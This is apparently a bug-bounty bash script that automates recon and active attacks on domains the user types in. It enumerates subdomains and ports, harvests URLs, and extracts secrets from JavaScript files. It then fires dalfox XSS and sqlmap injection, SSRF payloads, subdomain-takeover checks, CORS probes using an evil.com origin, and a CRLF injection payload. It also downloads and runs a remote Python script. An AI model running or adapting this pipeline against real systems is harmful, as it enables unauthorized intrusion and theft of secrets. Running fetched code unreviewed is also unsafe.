#!/bin/bash
cd --;
cd BBR;
# Define colors using tput
RED=$(tput setaf 1)      # Red
GREEN=$(tput setaf 2)    # Green
BLUE=$(tput setaf 4)     # Blue
RESET=$(tput sgr0)       # Reset colors
YELLOW=$(tput setaf 3)   # Yellow

read -p "${RED}Enter the name of the Directory: ${RESET}" dir_name

# Print the name
mkdir -p "$dir_name"; cd "$dir_name" || exit;

touch idea.txt; 
read -p "${YELLOW}Enter domains (comma-separated): ${RESET}" domains_input

# Split into an array
IFS=',' read -ra domains <<< "$domains_input"

#LOOP
for domain in "${domains[@]}"; do
    # Trim whitespace
    domain=$(echo "$domain" | xargs)
    subfinder -d "$domain" -o subd.txt
    amass enum -d "$domain" -o amass.txt
done
cat subd.txt amass.txt | sort -u > combined.txt
echo "${GREEN}Subdomains have been saved to combined.txt${RESET}"
rm subd.txt amass.txt
cat combined.txt | ~/go/bin/httpx -o active_subdomains_only.txt  
cat combined.txt | ~/go/bin/httpx -silent -status-code -title -tech-detect -o active_subdomains.txt  
grep -Ei "api|dev|staging|admin|oauth|internal" active_subdomains_only.txt > high_priority.txt  
awk '/ \[404\] / {print $1}' active_subdomains.txt > 404_temp.txt
awk '{print $1}' 404_temp.txt | sed 's|^https\?://||' > 404_domains.txt
rm 404_temp.txt

naabu -list active_subdomains_only.txt -top-ports 1000 -o naabu_results.txt
cat naabu_results.txt | grep -v "open" | cut -d ":" -f 1 > dead_ports.txt
cat naabu_results.txt | grep "open" | cut -d ":" -f 1 > open_ports.txt  

echo "${RED}collecting urls${RESET}" 

cat active_subdomains.txt | waybackurls > urls_tmp1.txt
cat active_subdomains.txt | gau > urls_tmp2.txt

for domain in "${domains[@]}"; do
    domain=$(echo "$domain" | xargs)
    katana -u "$domain" > urls_tmp3.txt
done
cat urls_tmp1.txt urls_tmp2.txt urls_tmp3.txt | sort -u > urls_tmp.txt
grep -Eiv "\.(jpg|jpeg|png|gif|webp|svg|mp4|webm|mov|avi|mp3|wav|ogg)(\?|$)" urls_tmp.txt > urls.txt
rm urls_tmp1.txt urls_tmp2.txt urls_tmp3.txt urls_tmp.txt
echo "${GREEN}URLs have been saved to urls.txt${RESET}"
curl -O https://raw.githubusercontent.com/shahariar-walid/recon/main/unique_url.py
python3 unique_url.py
cat unique_urls.txt | grep "=" > high_priority_urls.txt 

#fetch js files
cat urls.txt | grep -E "\.js$" > js_files.txt
#Extract secret from JS files
if [[ -s "js_files.txt" ]]; then
    while read -r url; do
        if [[ -f "tools/secretfinder/SecretFinder.py" ]]; then
            python3 tools/secretfinder/SecretFinder.py -i "$url" -o cli >> js_secrets.txt
        fi
        if [[ -f "tools/LinkFinder/LinkFinder.py" ]]; then
            python3 tools/LinkFinder/LinkFinder.py -i "$url" -o cli >> js_endpoints.txt
        fi
    done < js_files.txt
fi

#xss and sqli
gf xss high_priority_urls.txt | dalfox pipe  
#sqlmap -m high_priority_urls.txt --batch --level 2  
sqlmap -m high_priority_urls.txt --batch --level 1 --risk 1 --threads 10 --smart

#subdomain takeover
if [[ -s "404_domains.txt" ]]; then
    subzy run --targets 404_domains.txt --output subzy_results.txt
fi
#nuclei scan
nuclei -l active_subdomains_only.txt -t tools/nuclei-templates/ -silent -o nuclei_results.txt  

#ssrf and open redirect 
read -p "Enter burp collaborator url (or press Enter to skip): " user_url
if [ -n "$user_url" ]; then
    cat unique_urls.txt | grep "=" | qsreplace "$user_url" > ssrf_urls.txt
    if [[ -s "ssrf_urls.txt" ]]; then
        cat ssrf_urls.txt | ~/go/bin/httpx -fr 
    fi
fi

#CORS
echo -e "${GREEN}Testing for CORS misconfigurations...${RESET}"
while read -r url; do
    curl -s -I -H "Origin: https://evil.com" "$url" | 
    grep -i "access-control-allow-origin: https://evil.com" &&
    echo "$url - VULNERABLE" >> cors_vulns.txt
done < urls.txt

#CLRF
cat urls.txt | gf crlf | qsreplace "%0d%0aX-Test:crlf" | \
while read url; do curl -s -I "$url" | grep -i "X-Test" && echo "$url"; done

